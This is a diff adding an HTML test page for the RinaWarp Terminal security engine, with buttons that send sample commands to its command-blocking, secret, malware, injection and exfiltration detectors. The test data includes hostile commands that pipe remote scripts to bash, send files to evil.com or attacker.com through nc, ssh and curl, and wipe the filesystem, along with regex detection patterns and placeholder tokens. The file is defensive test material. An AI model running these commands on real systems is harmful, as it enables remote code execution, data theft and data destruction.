@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RinaWarp Terminal Security Test</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a1a;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #4CAF50;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .test-section {
+            background: #2a2a2a;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid #4CAF50;
+        }
+        .test-button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+            font-size: 14px;
+        }
+        .test-button:hover {
+            background: #45a049;
+        }
+        .test-button.danger {
+            background: #f44336;
+        }
+        .test-button.warning {
+            background: #ff9800;
+        }
+        .results {
+            background: #333;
+            border-radius: 4px;
+            padding: 15px;
+            margin-top: 10px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .status {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .status.success { background: #4CAF50; }
+        .status.error { background: #f44336; }
+        .status.warning { background: #ff9800; }
+        .status.info { background: #2196F3; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 RinaWarp Terminal Security Feature Tests</h1>
+        
+        <div class="test-section">
+            <h3>1. Security Engine Status</h3>
+            <button class="test-button" onclick="checkSecurityEngine()">Check Security Engine</button>
+            <button class="test-button" onclick="testThreatAssessment()">Run Threat Assessment</button>
+            <button class="test-button" onclick="checkSecurityMetrics()">View Security Metrics</button>
+            <div id="security-status" class="results"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>2. Command Verification Tests</h3>
+            <button class="test-button" onclick="testSafeCommands()">Test Safe Commands</button>
+            <button class="test-button warning" onclick="testRiskyCommands()">Test Risky Commands</button>
+            <button class="test-button danger" onclick="testDangerousCommands()">Test Dangerous Commands</button>
+            <div id="command-results" class="results"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>3. Secret Detection Tests</h3>
+            <button class="test-button" onclick="testSecretDetection()">Test Secret Detection</button>
+            <button class="test-button" onclick="testPasswordDetection()">Test Password Detection</button>
+            <button class="test-button" onclick="testTokenDetection()">Test Token Detection</button>
+            <div id="secret-results" class="results"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>4. Threat Detection Tests</h3>
+            <button class="test-button danger" onclick="testMalwareDetection()">Test Malware Detection</button>
+            <button class="test-button danger" onclick="testInjectionDetection()">Test Injection Detection</button>
+            <button class="test-button danger" onclick="testExfiltrationDetection()">Test Data Exfiltration</button>
+            <div id="threat-results" class="results"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>5. Zero Trust Evaluation</h3>
+            <button class="test-button" onclick="testZeroTrust()">Test Trust Scoring</button>
+            <button class="test-button" onclick="testTrustBaselines()">View Trust Baselines</button>
+            <div id="zerotrust-results" class="results"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>6. Security Dashboard</h3>
+            <button class="test-button" onclick="createSecurityDashboard()">Create Dashboard</button>
+            <button class="test-button" onclick="toggleDashboard()">Toggle Dashboard</button>
+            <button class="test-button" onclick="generateSecurityReport()">Generate Report</button>
+            <div id="dashboard-results" class="results"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>7. Audit and Compliance</h3>
+            <button class="test-button" onclick="testAuditLogging()">Test Audit Logging</button>
+            <button class="test-button" onclick="testComplianceChecking()">Test Compliance</button>
+            <button class="test-button" onclick="viewAuditHistory()">View Audit History</button>
+            <div id="audit-results" class="results"></div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables for testing
+        let securityEngine = null;
+
+        // Initialize security engine reference
+        function initializeSecurityEngine() {
+            try {
+                if (typeof EnhancedSecurityEngine !== 'undefined') {
+                    securityEngine = new EnhancedSecurityEngine();
+                    return true;
+                } else if (window.securityEngine) {
+                    securityEngine = window.securityEngine;
+                    return true;
+                } else {
+                    return false;
+                }
+            } catch (error) {
+                console.error('Failed to initialize security engine:', error);
+                return false;
+            }
+        }
+
+        // Utility functions
+        function logResult(elementId, message, type = 'info') {
+            const element = document.getElementById(elementId);
+            const timestamp = new Date().toLocaleTimeString();
+            const statusClass = type;
+            element.innerHTML += `[${timestamp}] <span class="status ${statusClass}">${type.toUpperCase()}</span> ${message}\n`;
+            element.scrollTop = element.scrollHeight;
+        }
+
+        function clearResults(elementId) {
+            document.getElementById(elementId).innerHTML = '';
+        }
+
+        // Test functions
+        function checkSecurityEngine() {
+            clearResults('security-status');
+            
+            if (initializeSecurityEngine()) {
+                logResult('security-status', 'Security Engine initialized successfully', 'success');
+                logResult('security-status', `Engine type: ${securityEngine.constructor.name}`, 'info');
+                
+                if (securityEngine.securityMetrics) {
+                    logResult('security-status', `Security metrics available: ${JSON.stringify(securityEngine.securityMetrics)}`, 'info');
+                }
+                
+                if (securityEngine.auditLogger) {
+                    logResult('security-status', 'Audit logger is available', 'success');
+                }
+                
+                if (securityEngine.threatDetector) {
+                    logResult('security-status', 'Threat detector is available', 'success');
+                }
+                
+                if (securityEngine.zeroTrustEngine) {
+                    logResult('security-status', 'Zero Trust engine is available', 'success');
+                }
+            } else {
+                logResult('security-status', 'Security Engine not found or failed to initialize', 'error');
+                logResult('security-status', 'Check if RinaWarp Terminal is running and security modules are loaded', 'warning');
+            }
+        }
+
+        function testThreatAssessment() {
+            if (!securityEngine) {
+                logResult('security-status', 'Security engine not available', 'error');
+                return;
+            }
+
+            try {
+                securityEngine.performThreatAssessment();
+                logResult('security-status', 'Threat assessment triggered successfully', 'success');
+            } catch (error) {
+                logResult('security-status', `Threat assessment failed: ${error.message}`, 'error');
+            }
+        }
+
+        function checkSecurityMetrics() {
+            if (!securityEngine) {
+                logResult('security-status', 'Security engine not available', 'error');
+                return;
+            }
+
+            try {
+                const metrics = securityEngine.securityMetrics;
+                logResult('security-status', 'Current Security Metrics:', 'info');
+                logResult('security-status', `  Commands Analyzed: ${metrics.commandsAnalyzed}`, 'info');
+                logResult('security-status', `  Threats Detected: ${metrics.threatsDetected}`, 'info');
+                logResult('security-status', `  Compliance Violations: ${metrics.complianceViolations}`, 'info');
+                logResult('security-status', `  Last Assessment: ${new Date(metrics.lastThreatAssessment).toLocaleString()}`, 'info');
+            } catch (error) {
+                logResult('security-status', `Failed to get security metrics: ${error.message}`, 'error');
+            }
+        }
+
+        async function testSafeCommands() {
+            clearResults('command-results');
+            
+            if (!securityEngine) {
+                logResult('command-results', 'Security engine not available', 'error');
+                return;
+            }
+
+            const safeCommands = ['echo "Hello"', 'pwd', 'ls -la', 'date', 'whoami'];
+            const context = {
+                userId: 'test-user',
+                sessionId: 'test-session',
+                cwd: '/home/user',
+                environment: 'test'
+            };
+
+            for (const command of safeCommands) {
+                try {
+                    logResult('command-results', `Testing: ${command}`, 'info');
+                    const result = await securityEngine.verifyCommandExecution(command, context);
+                    const status = result.allowed ? 'success' : 'error';
+                    logResult('command-results', `  Result: ${result.allowed ? 'ALLOWED' : 'BLOCKED'}`, status);
+                } catch (error) {
+                    logResult('command-results', `  Error: ${error.message}`, 'error');
+                }
+            }
+        }
+
+        async function testRiskyCommands() {
+            clearResults('command-results');
+            
+            if (!securityEngine) {
+                logResult('command-results', 'Security engine not available', 'error');
+                return;
+            }
+
+            const riskyCommands = ['sudo ls', 'rm -rf /tmp/test', 'curl https://example.com'];
+            const context = {
+                userId: 'test-user',
+                sessionId: 'test-session',
+                cwd: '/home/user',
+                environment: 'test'
+            };
+
+            for (const command of riskyCommands) {
+                try {
+                    logResult('command-results', `Testing: ${command}`, 'warning');
+                    const result = await securityEngine.verifyCommandExecution(command, context);
+                    const status = result.allowed ? (result.warning ? 'warning' : 'success') : 'error';
+                    logResult('command-results', `  Result: ${result.allowed ? 'ALLOWED' : 'BLOCKED'}`, status);
+                    if (result.warning) {
+                        logResult('command-results', `  Warning: ${result.reason}`, 'warning');
+                    }
+                } catch (error) {
+                    logResult('command-results', `  Error: ${error.message}`, 'error');
+                }
+            }
+        }
+
+        async function testDangerousCommands() {
+            clearResults('command-results');
+            
+            if (!securityEngine) {
+                logResult('command-results', 'Security engine not available', 'error');
+                return;
+            }
+
+            const dangerousCommands = ['sudo rm -rf /', 'chmod 777 /etc/passwd', 'format c:'];
+            const context = {
+                userId: 'test-user',
+                sessionId: 'test-session',
+                cwd: '/home/user',
+                environment: 'test'
+            };
+
+            for (const command of dangerousCommands) {
+                try {
+                    logResult('command-results', `Testing: ${command}`, 'error');
+                    const result = await securityEngine.verifyCommandExecution(command, context);
+                    const status = result.allowed ? 'warning' : 'success'; // Success if blocked!
+                    logResult('command-results', `  Result: ${result.allowed ? 'ALLOWED (UNEXPECTED!)' : 'BLOCKED (GOOD)'}`, status);
+                    if (!result.allowed) {
+                        logResult('command-results', `  Reason: ${result.reason}`, 'info');
+                    }
+                } catch (error) {
+                    logResult('command-results', `  Error: ${error.message}`, 'error');
+                }
+            }
+        }
+
+        async function testSecretDetection() {
+            clearResults('secret-results');
+            
+            if (!securityEngine) {
+                logResult('secret-results', 'Security engine not available', 'error');
+                return;
+            }
+
+            const secretCommands = [
+                'export API_KEY=sk_test_1234567890abcdef1234567890abcdef',
+                'curl -H "Authorization: Bearer ghp_1234567890abcdefghijklmnopqrstuvwxyz123456"',
+                'aws configure set aws_access_key_id AKIA1234567890EXAMPLE'
+            ];
+
+            for (const command of secretCommands) {
+                try {
+                    logResult('secret-results', `Scanning: ${command}`, 'info');
+                    const result = await securityEngine.scanForSecrets(command);
+                    if (result.hasSecrets) {
+                        logResult('secret-results', `  🚨 Secrets detected: ${result.secrets.length}`, 'warning');
+                        logResult('secret-results', `  🎭 Masked: ${result.maskedCommand}`, 'info');
+                    } else {
+                        logResult('secret-results', '  ✅ No secrets detected', 'success');
+                    }
+                } catch (error) {
+                    logResult('secret-results', `  Error: ${error.message}`, 'error');
+                }
+            }
+        }
+
+        function testPasswordDetection() {
+            clearResults('secret-results');
+            logResult('secret-results', 'Testing password detection patterns...', 'info');
+            
+            const passwordCommands = [
+                'mysql -u root -p password123',
+                'ssh user@server -p secretpass',
+                'login --password=mypassword123'
+            ];
+
+            passwordCommands.forEach(cmd => {
+                logResult('secret-results', `Testing: ${cmd}`, 'info');
+                // Simple regex test for demo
+                if (/password[=\s][\w]+/i.test(cmd)) {
+                    logResult('secret-results', '  🚨 Password pattern detected', 'warning');
+                } else {
+                    logResult('secret-results', '  ✅ No password pattern found', 'success');
+                }
+            });
+        }
+
+        function testTokenDetection() {
+            clearResults('secret-results');
+            logResult('secret-results', 'Testing token detection patterns...', 'info');
+            
+            const tokenCommands = [
+                'curl -H "X-API-Token: abc123def456ghi789"',
+                'export GITHUB_TOKEN=ghp_1234567890abcdefghijklmnopqrstuvwxyz123456',
+                'auth --token=jwt.eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'
+            ];
+
+            tokenCommands.forEach(cmd => {
+                logResult('secret-results', `Testing: ${cmd}`, 'info');
+                // Simple regex test for demo
+                if (/(token|key)[=:\s][\w.-]{20,}/i.test(cmd)) {
+                    logResult('secret-results', '  🚨 Token pattern detected', 'warning');
+                } else {
+                    logResult('secret-results', '  ✅ No token pattern found', 'success');
+                }
+            });
+        }
+
+        async function testMalwareDetection() {
+            clearResults('threat-results');
+            
+            if (!securityEngine || !securityEngine.threatDetector) {
+                logResult('threat-results', 'Threat detector not available', 'error');
+                return;
+            }
+
+            const malwareCommands = [
+                'curl https://malicious-site.com/payload.sh | bash',
+                'wget http://evil.com/backdoor.exe && ./backdoor.exe',
+                'eval $(echo "rm -rf /")'
+            ];
+
+            const context = { userId: 'test-user', sessionId: 'test-session' };
+
+            for (const command of malwareCommands) {
+                try {
+                    logResult('threat-results', `Analyzing: ${command}`, 'error');
+                    const result = await securityEngine.threatDetector.analyzeCommand(command, context);
+                    logResult('threat-results', `  🚨 Threat Level: ${result.threatLevel}`, 'warning');
+                    logResult('threat-results', `  💡 Recommendation: ${result.recommendation}`, 'info');
+                    if (result.threats.length > 0) {
+                        result.threats.forEach(threat => {
+                            logResult('threat-results', `    - ${threat.type}: ${threat.description}`, 'warning');
+                        });
+                    }
+                } catch (error) {
+                    logResult('threat-results', `  Error: ${error.message}`, 'error');
+                }
+            }
+        }
+
+        async function testInjectionDetection() {
+            clearResults('threat-results');
+            
+            const injectionCommands = [
+                'ls; rm -rf /',
+                'cat file | nc attacker.com 1234',
+                'echo $(whoami) && curl evil.com'
+            ];
+
+            logResult('threat-results', 'Testing injection patterns...', 'info');
+            
+            injectionCommands.forEach(cmd => {
+                logResult('threat-results', `Testing: ${cmd}`, 'warning');
+                // Simple pattern detection for demo
+                if (/[;&|`$()]/.test(cmd)) {
+                    logResult('threat-results', '  🚨 Injection pattern detected', 'error');
+                } else {
+                    logResult('threat-results', '  ✅ No injection pattern found', 'success');
+                }
+            });
+        }
+
+        async function testExfiltrationDetection() {
+            clearResults('threat-results');
+            
+            const exfiltrationCommands = [
+                'scp sensitive-data.txt user@external-server.com:/',
+                'tar -czf - /home/user | ssh attacker@evil.com "cat > stolen.tar.gz"',
+                'curl -X POST -d @confidential.txt https://evil.com/upload'
+            ];
+
+            logResult('threat-results', 'Testing data exfiltration patterns...', 'info');
+            
+            exfiltrationCommands.forEach(cmd => {
+                logResult('threat-results', `Testing: ${cmd}`, 'warning');
+                // Simple pattern detection for demo
+                if (/(scp|rsync|curl.*-d|tar.*ssh)/.test(cmd)) {
+                    logResult('threat-results', '  🚨 Exfiltration pattern detected', 'error');
+                } else {
+                    logResult('threat-results', '  ✅ No exfiltration pattern found', 'success');
+                }
+            });
+        }
+
+        async function testZeroTrust() {
+            clearResults('zerotrust-results');
+            
+            if (!securityEngine || !securityEngine.zeroTrustEngine) {
+                logResult('zerotrust-results', 'Zero Trust engine not available', 'error');
+                return;
+            }
+
+            const commands = ['ls -la', 'sudo systemctl status', 'rm -rf /important-data'];
+            const context = {
+                userId: 'test-user',
+                sessionAge: 1800000,
+                deviceTrusted: true,
+                locationTrusted: true
+            };
+
+            for (const command of commands) {
+                try {
+                    logResult('zerotrust-results', `Evaluating: ${command}`, 'info');
+                    const result = await securityEngine.zeroTrustEngine.evaluateTrustScore(command, context);
+                    logResult('zerotrust-results', `  🎯 Trust Score: ${result.score.toFixed(2)}`, 'info');
+                    const trustStatus = result.requiresAdditionalVerification ? 'warning' : 'success';
+                    logResult('zerotrust-results', `  ${result.requiresAdditionalVerification ? '🔐 REQUIRES MFA' : '✅ TRUSTED'}`, trustStatus);
+                } catch (error) {
+                    logResult('zerotrust-results', `  Error: ${error.message}`, 'error');
+                }
+            }
+        }
+
+        function testTrustBaselines() {
+            clearResults('zerotrust-results');
+            
+            if (!securityEngine || !securityEngine.zeroTrustEngine) {
+                logResult('zerotrust-results', 'Zero Trust engine not available', 'error');
+                return;
+            }
+
+            logResult('zerotrust-results', 'Trust Baselines:', 'info');
+            
+            if (securityEngine.zeroTrustEngine.trustBaselines) {
+                for (const [userType, baseline] of securityEngine.zeroTrustEngine.trustBaselines) {
+                    logResult('zerotrust-results', `  ${userType}: ${baseline}`, 'info');
+                }
+            }
+            
+            if (securityEngine.zeroTrustEngine.verificationRequirements) {
+                logResult('zerotrust-results', '\nVerification Requirements:', 'info');
+                for (const [category, requirement] of securityEngine.zeroTrustEngine.verificationRequirements) {
+                    logResult('zerotrust-results', `  ${category}: Score ${requirement.minTrustScore}, MFA: ${requirement.requiresMFA}`, 'info');
+                }
+            }
+        }
+
+        function createSecurityDashboard() {
+            clearResults('dashboard-results');
+            
+            if (!securityEngine) {
+                logResult('dashboard-results', 'Security engine not available', 'error');
+                return;
+            }
+
+            try {
+                securityEngine.createSecurityDashboard();
+                logResult('dashboard-results', 'Security dashboard created successfully', 'success');
+                
+                const dashboard = document.getElementById('security-dashboard');
+                if (dashboard) {
+                    logResult('dashboard-results', 'Dashboard element found in DOM', 'success');
+                } else {
+                    logResult('dashboard-results', 'Dashboard element not found in DOM', 'warning');
+                }
+            } catch (error) {
+                logResult('dashboard-results', `Failed to create dashboard: ${error.message}`, 'error');
+            }
+        }
+
+        function toggleDashboard() {
+            const dashboard = document.getElementById('security-dashboard');
+            if (dashboard) {
+                dashboard.classList.toggle('hidden');
+                const isVisible = !dashboard.classList.contains('hidden');
+                logResult('dashboard-results', `Dashboard ${isVisible ? 'shown' : 'hidden'}`, 'info');
+            } else {
+                logResult('dashboard-results', 'Dashboard not found. Create it first.', 'warning');
+            }
+        }
+
+        function generateSecurityReport() {
+            clearResults('dashboard-results');
+            
+            if (!securityEngine) {
+                logResult('dashboard-results', 'Security engine not available', 'error');
+                return;
+            }
+
+            try {
+                const report = securityEngine.generateSecurityReport('1h');
+                logResult('dashboard-results', 'Security Report Generated:', 'success');
+                logResult('dashboard-results', JSON.stringify(report, null, 2), 'info');
+            } catch (error) {
+                logResult('dashboard-results', `Failed to generate report: ${error.message}`, 'error');
+            }
+        }
+
+        function testAuditLogging() {
+            clearResults('audit-results');
+            
+            if (!securityEngine || !securityEngine.auditLogger) {
+                logResult('audit-results', 'Audit logger not available', 'error');
+                return;
+            }
+
+            try {
+                // Test audit logging
+                const testEntry = {
+                    id: 'test-' + Date.now(),
+                    timestamp: Date.now(),
+                    command: 'test command',
+                    userId: 'test-user',
+                    result: { exitCode: 0 }
+                };
+                
+                securityEngine.auditLogger.storeAuditEntry(testEntry);
+                logResult('audit-results', 'Test audit entry stored successfully', 'success');
+                
+                const history = securityEngine.auditLogger.getAuditHistory(5);
+                logResult('audit-results', `Audit history contains ${history.length} entries`, 'info');
+                
+            } catch (error) {
+                logResult('audit-results', `Audit logging test failed: ${error.message}`, 'error');
+            }
+        }
+
+        async function testComplianceChecking() {
+            clearResults('audit-results');
+            
+            if (!securityEngine || !securityEngine.complianceChecker) {
+                logResult('audit-results', 'Compliance checker not available', 'error');
+                return;
+            }
+
+            const testCommands = [
+                'cat /etc/passwd',
+                'select * from users where ssn = "123-45-6789"',
+                'mysqldump --all-databases > backup.sql'
+            ];
+
+            const context = {
+                userId: 'test-user',
+                department: 'IT',
+                clearanceLevel: 'standard'
+            };
+
+            for (const command of testCommands) {
+                try {
+                    logResult('audit-results', `Compliance check: ${command}`, 'info');
+                    const result = await securityEngine.complianceChecker.verify(command, context);
+                    const status = result.compliant ? 'success' : 'warning';
+                    logResult('audit-results', `  ${result.compliant ? '✅ COMPLIANT' : '❌ NON-COMPLIANT'}`, status);
+                    
+                    if (result.violations && result.violations.length > 0) {
+                        result.violations.forEach(violation => {
+                            logResult('audit-results', `    Violation: ${violation.message}`, 'warning');
+                        });
+                    }
+                } catch (error) {
+                    logResult('audit-results', `  Error: ${error.message}`, 'error');
+                }
+            }
+        }
+
+        function viewAuditHistory() {
+            clearResults('audit-results');
+            
+            if (!securityEngine || !securityEngine.auditLogger) {
+                logResult('audit-results', 'Audit logger not available', 'error');
+                return;
+            }
+
+            try {
+                const history = securityEngine.auditLogger.getAuditHistory(10);
+                logResult('audit-results', `Audit History (last 10 entries):`, 'info');
+                
+                if (history.length === 0) {
+                    logResult('audit-results', 'No audit entries found', 'warning');
+                } else {
+                    history.forEach((entry, index) => {
+                        const timestamp = new Date(entry.timestamp).toLocaleString();
+                        logResult('audit-results', `${index + 1}. [${timestamp}] ${entry.command || 'Unknown command'}`, 'info');
+                    });
+                }
+                
+                const recentActivity = securityEngine.auditLogger.getRecentActivity(3600000);
+                logResult('audit-results', `Recent activity (1h): ${recentActivity.length} entries`, 'info');
+                
+            } catch (error) {
+                logResult('audit-results', `Failed to view audit history: ${error.message}`, 'error');
+            }
+        }
+
+        // Initialize on page load
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                checkSecurityEngine();
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
